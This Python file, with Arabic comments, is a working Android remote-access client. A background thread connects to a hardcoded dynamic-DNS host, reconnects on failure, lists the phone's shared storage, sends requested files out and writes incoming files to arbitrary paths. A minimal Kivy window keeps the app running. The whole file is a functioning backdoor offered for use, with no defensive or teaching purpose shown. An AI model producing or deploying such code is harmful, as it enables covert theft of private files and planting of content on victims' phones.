import socket
import os
import time
import threading

# ضع رابط No-IP والبورت الخاص بك هنا
HOST = 'xheemax.hopto.org'  # استبدل هذا برابطك
PORT = 5214               # البورت المفتوح

def run_client():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST, PORT))
            
            while True:
                cmd = client.recv(1024).decode('utf-8')
                if not cmd or cmd.lower() == 'exit':
                    break
                
                if cmd.startswith('ls'):
                    path = "/storage/emulated/0/"
                    try:
                        files = "\n".join(os.listdir(path))
                    except Exception as e:
                        files = f"Error: {e}"
                    client.send(files.encode('utf-8'))
                    
                elif cmd.startswith('download'):
                    path = cmd.split(' ')[1]
                    if os.path.exists(path):
                        with open(path, 'rb') as f:
                            while chunk := f.read(4096):
                                client.send(chunk)
                        client.send(b'DONE')
                    else:
                        client.send(b'FILE_NOT_FOUND')
                        
                elif cmd.startswith('upload'):
                    parts = cmd.split(' ')
                    dest_path = parts[2]
                    with open(dest_path, 'wb') as f:
                        while True:
                            data = client.recv(4096)
                            if data == b'DONE':
                                break
                            f.write(data)
            client.close()
        except:
            time.sleep(5)

if __name__ == '__main__':
    # تشغيل الاتصال في الخلفية
    threading.Thread(target=run_client, daemon=True).start()
    
    # واجهة بسيطة جداً ليبقى التطبيق شغلاً على أندرويد كبرنامج مرئي
    from kivy.app import App
    from kivy.uix.label import Label
    
    class MyApp(App):
        def build(self):
            return Label(text='[ Service Running Background ]\nمتصل بنظام التحكم عن بُعد', font_size=18)

    MyApp().run()